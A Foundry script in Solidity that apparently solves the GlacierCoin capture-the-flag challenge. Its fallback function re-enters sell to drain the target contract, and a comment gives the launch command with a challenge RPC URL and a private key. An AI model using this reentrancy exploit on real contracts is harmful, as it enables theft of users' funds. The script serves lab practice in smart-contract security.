// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;
import {Setup} from "../src/GlacierCoin/Setup.sol";
import {GlacierCoin} from "../src/GlacierCoin/Challenge.sol";
import {Script} from "forge-std/Script.sol";
import {console} from "forge-std/console.sol";

contract AttackScript is Script{
    function run() public{
        vm.startBroadcast();
        new Attack{value: 20 ether}().exploit();
        console.log("Attack Success");
        vm.stopBroadcast();
    }
}

contract Attack{
    Setup public setupContract = Setup(0x1163C62DE50f6f148e3deA99cA65EBAff3fab967);
    GlacierCoin public TARGET = GlacierCoin(address(setupContract.TARGET()));
    constructor() payable {
        require(msg.value == 20 ether); // For attack contract usage
    }
    function exploit() public{
        TARGET.buy{value: 10 ether}();
        TARGET.sell(10 ether);
    }
    fallback() external payable { 
        TARGET.sell(10 ether);    
    }
}


// forge script script/GlacierCoinAttack.s.sol:AttackScript --rpc-url http://34.159.107.195:18545/9475efd7-2696-4e32-9fc8-d3b1560718c4 --private-key 0xba17740c480236101194f4dcb7f0cb2c607a51253c21ac0371097871ac6a909a --broadcast